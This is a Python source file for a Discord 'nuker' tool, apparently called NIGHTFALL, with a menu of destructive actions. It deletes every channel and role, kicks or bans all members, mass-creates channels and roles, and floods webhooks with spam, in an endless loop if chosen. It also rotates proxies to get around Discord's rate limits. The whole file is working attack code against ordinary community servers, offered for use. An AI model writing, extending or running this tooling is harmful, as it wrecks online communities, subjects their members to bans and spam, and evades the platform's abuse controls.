# nuker.py
import discord
from discord.ext import commands
from colorama import Fore, Style, init
import asyncio
import random
from discord.http import HTTPClient

nuker_art = r'''
                        [01] > Back             [02] > Delete Channels  [03] > Delete Roles
                        [04] > Kick All         [05] > Ban All          [06] > Create Channels
                        [07] > Create Roles     [08] > Create Webhooks  [09] > Delete Webhooks
                        [10] > Spam Webhooks    [11] > Set Server Name  [12] > Set Server Icon
                        [13] > Destroy Server
'''

init(autoreset=True)
VERBOSE_LOGGING = True

# Load proxies globally
with open("assets/proxies/proxylist.txt", "r") as f:
    PROXIES = [line.strip() for line in f if line.strip()]
if not PROXIES:
    print(Fore.YELLOW + "[!] Proxy list is empty. Running without proxies." + Style.RESET_ALL)

current_proxy_index = 0

def get_next_proxy():
    global current_proxy_index
    if not PROXIES:
        return None
    proxy = PROXIES[current_proxy_index]
    current_proxy_index = (current_proxy_index + 1) % len(PROXIES)
    return proxy

# This function will now be called with the bot instance when a proxy needs to be set/rotated.
def set_http_client_for_bot(bot_instance, proxy_url=None):
    if proxy_url:
        # discord.py's HTTPClient constructor accepts a 'proxy' argument
        # Setting connector=None to use default for this case
        new_http_client = HTTPClient(connector=None, proxy=proxy_url, loop=bot_instance.loop)
    else:
        new_http_client = HTTPClient(loop=bot_instance.loop)
    bot_instance.http = new_http_client
    if VERBOSE_LOGGING:
        print(Fore.MAGENTA + f"[>] Bot's HTTP client updated with proxy: {proxy_url if proxy_url else 'None'}" + Style.RESET_ALL)

def toggle_verbose_logging():
    global VERBOSE_LOGGING
    VERBOSE_LOGGING = not VERBOSE_LOGGING
    print(Fore.CYAN + f"[>] Verbose logging is now {'ON' if VERBOSE_LOGGING else 'OFF'}" + Style.RESET_ALL)

# ---------------------- Core Functions ----------------------

async def delete_channels(guild: discord.Guild):
    print(Fore.CYAN + f"[>] Deleting channels in '{guild.name}'..." + Style.RESET_ALL)
    tasks = [run_with_retry(guild._state._get_client(), channel.delete(), f"delete_channel:{channel.name}") for channel in guild.channels]
    await asyncio.gather(*tasks)

async def delete_roles(guild: discord.Guild):
    print(Fore.CYAN + f"[>] Deleting roles in '{guild.name}'..." + Style.RESET_ALL)
    roles = sorted(
        [role for role in guild.roles if role.name != "@everyone" and not role.managed and guild.me.top_role > role],
        key=lambda r: r.position,
        reverse=True
    )
    tasks = [run_with_retry(guild._state._get_client(), role.delete(), f"delete_role:{role.name}") for role in roles]
    await asyncio.gather(*tasks)

async def kick_all(guild: discord.Guild):
    print(Fore.CYAN + f"[>] Kicking members in '{guild.name}'..." + Style.RESET_ALL)
    tasks = [
        run_with_retry(guild._state._get_client(), member.kick(), f"kick:{member.name}")
        for member in guild.members
        if not member.bot and member != guild.me and guild.me.top_role > member.top_role
    ]
    await asyncio.gather(*tasks)

async def ban_all(guild: discord.Guild):
    print(Fore.CYAN + f"[>] Banning members in '{guild.name}'..." + Style.RESET_ALL)
    tasks = [
        run_with_retry(guild._state._get_client(), guild.ban(member), f"ban:{member.name}")
        for member in guild.members
        if member != guild.me and guild.me.top_role > member.top_role
    ]
    await asyncio.gather(*tasks)

async def create_channels(guild: discord.Guild):
    channel_name = input(Fore.MAGENTA + "[?] Enter channel name: " + Style.RESET_ALL)
    try:
        amount = int(input(Fore.MAGENTA + "[?] Number of channels: " + Style.RESET_ALL))
        tasks = [
            run_with_retry(guild._state._get_client(), guild.create_text_channel(f"{channel_name}-{i+1}"), f"create_channel:{i+1}")
            for i in range(amount)
        ]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r is not None)
        print(Fore.GREEN + f"[+] Created {success} channels." + Style.RESET_ALL)
    except ValueError:
        print(Fore.RED + "[-] Invalid number entered." + Style.RESET_ALL)

async def create_roles(guild: discord.Guild):
    role_name = input(Fore.MAGENTA + "[?] Enter role name: " + Style.RESET_ALL)
    try:
        amount = int(input(Fore.MAGENTA + "[?] Number of roles: " + Style.RESET_ALL))
        tasks = [
            run_with_retry(guild._state._get_client(), guild.create_role(name=f"{role_name}-{i+1}"), f"create_role:{i+1}")
            for i in range(amount)
        ]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r is not None)
        print(Fore.GREEN + f"[+] Created {success} roles." + Style.RESET_ALL)
    except ValueError:
        print(Fore.RED + "[-] Invalid number entered." + Style.RESET_ALL)

async def create_webhooks(guild: discord.Guild):
    print(Fore.CYAN + "[>] Creating webhooks for text channels..." + Style.RESET_ALL)
    results = []
    for channel in guild.text_channels:
        result = await run_with_retry(guild._state._get_client(), channel.create_webhook(name=f"Webhook-{channel.name}"), f"create_webhook:{channel.name}")
        results.append(result)
        await asyncio.sleep(2.5)  # Slow down webhook creation to avoid rate limits
    success = sum(1 for r in results if r is not None)
    print(Fore.GREEN + f"[+] Created {success} webhooks." + Style.RESET_ALL)

async def delete_webhooks(guild: discord.Guild):
    print(Fore.CYAN + "[>] Deleting webhooks..." + Style.RESET_ALL)
    tasks = []
    for channel in guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            tasks.extend([run_with_retry(guild._state._get_client(), w.delete(), f"delete_webhook:{w.name}") for w in webhooks])
        except Exception:
            if VERBOSE_LOGGING:
                print(Fore.YELLOW + f"[-] Could not fetch webhooks for channel {channel.name}" + Style.RESET_ALL)
            continue
    await asyncio.gather(*tasks)

async def spam_webhooks(guild: discord.Guild):
    webhook_name = input(Fore.MAGENTA + "[?] Webhook name: " + Style.RESET_ALL)
    message = input(Fore.MAGENTA + "[?] Message: " + Style.RESET_ALL)
    try:
        amount = int(input(Fore.MAGENTA + "[?] Messages per webhook (0 = infinite): " + Style.RESET_ALL))
        webhooks = []
        for channel in guild.text_channels:
            try:
                webhooks.extend(await channel.webhooks())
            except Exception:
                if VERBOSE_LOGGING:
                    print(Fore.YELLOW + f"[-] Could not fetch webhooks for channel {channel.name}" + Style.RESET_ALL)
                continue

        if not webhooks:
            print(Fore.YELLOW + "[-] No webhooks found." + Style.RESET_ALL)
            return

        if amount == 0:
            print(Fore.YELLOW + "[!] Continuous spamming... Press Ctrl+C to stop." + Style.RESET_ALL)
            while True:
                await asyncio.gather(*[
                    run_with_retry(guild._state._get_client(), webhook.send(content=message, username=webhook_name), f"spam_webhook:{webhook.name}")
                    for webhook in webhooks
                ])
                await asyncio.sleep(0.5)
        else:
            for _ in range(amount):
                await asyncio.gather(*[
                    run_with_retry(guild._state._get_client(), webhook.send(content=message, username=webhook_name), f"spam_webhook:{webhook.name}")
                    for webhook in webhooks
                ])
                await asyncio.sleep(0.2)
            print(Fore.GREEN + f"[+] Sent {amount * len(webhooks)} messages." + Style.RESET_ALL)
    except ValueError:
        print(Fore.RED + "[-] Invalid number entered." + Style.RESET_ALL)

async def set_server_name(guild: discord.Guild):
    name = input(Fore.MAGENTA + "[?] New server name: " + Style.RESET_ALL)
    await run_with_retry(guild._state._get_client(), guild.edit(name=name), f"set_server_name:{name}")

async def set_server_icon(guild: discord.Guild):
    path = input(Fore.MAGENTA + "[?] Path to new server icon (e.g., assets/icon.png): " + Style.RESET_ALL)
    try:
        with open(path, 'rb') as f:
            icon = f.read()
        await run_with_retry(guild._state._get_client(), guild.edit(icon=icon), "set_server_icon")
        print(Fore.GREEN + "[+] Server icon updated." + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + "[-] Icon file not found." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to update icon: {e}" + Style.RESET_ALL)

async def destroy_server(guild: discord.Guild):
    print(Fore.CYAN + "[>] Nuking server: deleting channels, banning, creating channels/webhooks, and spamming..." + Style.RESET_ALL)

    # Load spam messages
    try:
        with open("assets/messages/tokens/list.txt", "r", encoding="utf-8") as f:
            spam_lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "[-] 'list.txt' not found. Please ensure it exists and contains messages." + Style.RESET_ALL)
        return

    if not spam_lines:
        print(Fore.RED + "[-] 'list.txt' is empty. Please add messages to it." + Style.RESET_ALL)
        return

    # Step 1: Delete all channels concurrently
    delete_tasks = [run_with_retry(guild._state._get_client(), c.delete(), f"delete_channel:{c.name}") for c in guild.channels]
    print(Fore.CYAN + "[>] Deleting all channels..." + Style.RESET_ALL)
    await asyncio.gather(*delete_tasks)

    # Step 2: Ban all members concurrently
    # Ensure bot has higher role than members it's trying to ban.
    ban_tasks = [run_with_retry(guild._state._get_client(), guild.ban(m), f"ban:{m.name}") for m in guild.members if m != guild.me and guild.me.top_role > m.top_role]
    print(Fore.CYAN + "[>] Banning all members..." + Style.RESET_ALL)
    await asyncio.gather(*ban_tasks)

    # Step 3: Create new channels concurrently
    print(Fore.CYAN + "[>] Creating new channels..." + Style.RESET_ALL)
    # Changed to create 10 channels as requested.
    channel_tasks = [guild.create_text_channel(f"nuked-{i+1}") for i in range(20)]
    created_channels = await asyncio.gather(*channel_tasks)
    created_channels = [c for c in created_channels if c is not None] # Filter out failed channel creations

    # Step 4: Create webhooks concurrently without artificial delays
    webhooks = []
    print(Fore.CYAN + "[>] Creating webhooks concurrently..." + Style.RESET_ALL)
    webhook_creation_tasks = []
    for c in created_channels:
        if c: # Ensure channel creation was successful
            webhook_creation_tasks.append(run_with_retry(guild._state._get_client(), c.create_webhook(name="🔥"), f"create_webhook:{c.name}"))
    
    # Gather all webhook creation tasks to run them in parallel
    created_webhooks = await asyncio.gather(*webhook_creation_tasks)
    webhooks = [w for w in created_webhooks if w is not None] # Collect successfully created webhooks

    if not webhooks:
        print(Fore.RED + "[-] No webhooks created. Aborting spam." + Style.RESET_ALL)
        return

    # Step 5: Spam webhooks indefinitely
    print(Fore.YELLOW + "[!] Webhooks ready. Spamming... Press Ctrl+C to stop." + Style.RESET_ALL)
    try:
        while True:
            await asyncio.gather(*[
                run_with_retry(
                    guild._state._get_client(),
                    webhook.send(content=random.choice(spam_lines), username="NIGHTFALL V0.1.0"),
                    f"spam_webhook:{webhook.name}"
                )
                for webhook in webhooks
            ])
            await asyncio.sleep(0.5) # Small delay to prevent overwhelming API, can be adjusted
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Interrupted by user. Stopping spam." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] An error occurred during spamming: {e}" + Style.RESET_ALL)


# ---------------------- Rate Limit Handler with Proxy Rotation ----------------------

# Modified run_with_retry to accept the bot instance
async def run_with_retry(bot_instance, coro, name="", max_retries=5):
    for attempt in range(max_retries):
        try:
            result = await coro
            if VERBOSE_LOGGING:
                print(Fore.GREEN + f"[+] Success: {name}" + Style.RESET_ALL)
            return result

        except discord.NotFound: # 404 error, resource not found (e.g., channel already deleted)
            if VERBOSE_LOGGING:
                print(Fore.YELLOW + f"[-] Resource not found for {name}. It might have already been processed." + Style.RESET_ALL)
            return None # Treat as success for cleanup operations

        except discord.Forbidden as e: # 403 error, bot lacks permissions
            print(Fore.RED + f"[-] Permission denied on {name}: {e}. Bot lacks permissions." + Style.RESET_ALL)
            return None # Cannot proceed without permissions

        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = getattr(e, "retry_after", 5)
                print(Fore.YELLOW + f"[!] Rate limited on {name}. Retrying in {retry_after:.2f}s..." + Style.RESET_ALL)

                # Rotate proxy on rate limit if proxies available
                if PROXIES:
                    next_proxy = get_next_proxy()
                    print(Fore.MAGENTA + f"[>] Switching proxy to: {next_proxy}" + Style.RESET_ALL)
                    # Dynamically update the HTTP client proxy
                    set_http_client_for_bot(bot_instance, next_proxy)

                await asyncio.sleep(retry_after)

            else:
                print(Fore.RED + f"[-] HTTPException on {name} (Status: {e.status}): {e}" + Style.RESET_ALL)
                break # Break on non-429 HTTP errors

        except Exception as e:
            print(Fore.RED + f"[-] Unexpected Error on {name}: {e}" + Style.RESET_ALL)
            break

    print(Fore.RED + f"[-] Failed after {max_retries} attempts: {name}" + Style.RESET_ALL)
    return None